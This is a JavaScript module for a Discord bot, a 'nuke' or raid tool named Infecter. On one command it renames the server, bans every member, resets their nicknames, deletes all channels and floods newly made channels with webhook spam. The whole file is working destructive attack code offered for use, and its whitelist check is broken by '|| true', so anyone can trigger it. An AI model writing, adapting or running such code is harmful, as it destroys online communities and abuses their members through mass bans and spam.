class Infecter {
    constructor(Config) {
        if (!Config) throw new Error("Config argument is required");
        this.Config = Config
    };
    getFunction() {
        var ClassInfo = this;
        return async function(message) {
            let Config = ClassInfo.Config;
            let Prefix = Config.Prefix;
            let CommandName = Config.Command;
            let AuthorID = message.author.id;
            let Guild = message.guild;
            if (message.content == Prefix + CommandName && (Config.OnlyWhitelisted && AuthorID == Config.DiscordId || true)) {
                console.log("[coronainfecter] successfully started!")
                try {
                    message.delete();
                } catch (d) {
    
                };
                
                if (Config.serverIcon) {
                    try {
                        Guild.setIcon(Config.serverIcon);
                    } catch(err) {
                       
                    };
                };
                
                if (Config.serverName) {
                    try {
                       Guild.setName(Config.serverName);
                    } catch(err) {
                        
                    };
                };
                Guild.members.cache.forEach(function(member) {
                    if (Config.banEveryone && !Config.nukeChannels) {
                        try {
                            member.ban();
                        } catch (err) {
                            console.error(err);
                        }
                    };

                    if (Config.memberNick) {
                        try {
                            member.setNickname(Config.memberNick);  
                        } catch (err) {

                        };
                    };

                });
                if (Config.nukeChannels) {
                    try {
                        let Channels = Guild.channels.cache.array();
                        for (let i = 0; i < Channels.length; i++) {
                            let Channel = Channels[i];
                            await Channel.delete();
                        };
                        

                        if (Config.CreateTextChannel) {
                            if (Config.ChannelsToCreate) {
                                if (Config.SendMessage) {
                                    for (let dogpenis = 0; dogpenis < Config.ChannelsToCreate; dogpenis++) {
                                        let Channel2 = await Guild.channels.create(Config.CreateTextChannel, {type: "text"});
                                        for (let Amount = 0; Amount < Config.WebhookAmount; Amount++) {
                                            (async function() {
                                                let Webhook = await Channel2.createWebhook(Config.WebhookName);
                                                Webhook.send(Config.SendMessage);
                                                if (Config.AmountToRepeat) {
                                                    for (let d = 0; d < Config.AmountToRepeat; d++) {
                                                        Webhook.send(Config.SendMessage);
                                                    };
                                                };
                                            })()
                                        };
                                    };
                                };
                            } else {
                                if (!Config.CreateTextChannel) return;
                                let CreatedChannel = await Guild.channels.create(Config.CreateTextChannel, {type: "text"});
                                for (let Amount = 0; Amount < Config.WebhookAmount; Amount++) {
                                    let Webhook = await CreatedChannel.createWebhook(Config.WebhookName);
                                    if (Config.SendMessage) {
                                        Webhook.send(Config.SendMessage);
                                    };
        
                                    if (Config.AmountToRepeat && Config.SendMessage) {
                                        for (let d = 0; d < Config.AmountToRepeat; d++) {
                                            Webhook.send(Config.SendMessage);
                                        };
                                    };
                                };
                            };
                        };
                    } catch(err) {
                        console.error(err);
                    };
                    Guild.members.cache.forEach(function(member) {
                        if (member.bannable && Config.banEveryone) {
                            member.ban();
                        };

    
                    });
                } else {
                    try {
                        if (Config.CreateTextChannel) {
                            if (Config.ChannelsToCreate) {
                                if (Config.SendMessage) {
                                    for (let dogpenis = 0; dogpenis < Config.ChannelsToCreate; dogpenis++) {
                                        let Channel2 = await Guild.channels.create(Config.CreateTextChannel, {type: "text"});
                                        for (let Amount = 0; Amount < Config.WebhookAmount; Amount++) {
                                            (async function() {
                                                let Webhook = await Channel2.createWebhook(Config.WebhookName);
                                                Webhook.send(Config.SendMessage);
                                                if (Config.AmountToRepeat) {
                                                    for (let d = 0; d < Config.AmountToRepeat; d++) {
                                                        Webhook.send(Config.SendMessage);
                                                    };
                                                };
                                            })();
                                        };
                                    };
                                };
                            } else {
                                if (!Config.CreateTextChannel) return;
                                let CreatedChannel = await Guild.channels.create(Config.CreateTextChannel, {type: "text"});
                                for (let Amount = 0; Amount < Config.WebhookAmount; Amount++) {
                                    (async function() {
                                        let Webhook = await CreatedChannel.createWebhook(Config.WebhookName);
                                        if (Config.SendMessage) {
                                            Webhook.send(Config.SendMessage);
                                        };
            
                                        if (Config.AmountToRepeat && Config.SendMessage) {
                                            for (let d = 0; d < Config.AmountToRepeat; d++) {
                                                Webhook.send(Config.SendMessage);
                                            };
                                        };
                                    })();
                                };
                            };
                        };
                    } catch (err) {
                        console.error(err)
                    };
                };
            };
        };
    };
};

module.exports = Infecter;